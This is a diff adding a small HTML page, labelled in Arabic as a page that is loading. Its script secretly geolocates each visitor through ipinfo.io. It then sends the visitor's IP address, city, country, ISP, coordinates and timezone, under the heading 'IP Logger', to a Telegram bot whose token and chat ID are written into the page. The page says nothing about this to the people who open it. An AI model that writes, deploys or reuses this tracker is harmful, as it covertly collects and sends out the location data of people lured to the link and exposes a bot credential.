@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>جاري التحميل...</title>
+</head>
+<body>
+  <h2>جارٍ تحميل الصفحة...</h2>
+  <script>
+    fetch("https://ipinfo.io/json")
+      .then(res => res.json())
+      .then(data => {
+        const message = `
+📍 IP Logger
+---------------------
+🌐 IP: ${data.ip}
+🏙️ City: ${data.city}
+🌎 Country: ${data.country}
+📱 ISP: ${data.org}
+📍 Location: ${data.loc}
+🕒 Timezone: ${data.timezone}
+        `;
+        fetch(`https://api.telegram.org/ 8109358097:AAECSNByttNiJJ63R9tGvHA5XZAw-Rw5B_Y
+/sendMessage?chat_id=1342353358&text=${encodeURIComponent(message)}`);
+      });
+  </script>
+</body>
+</html>
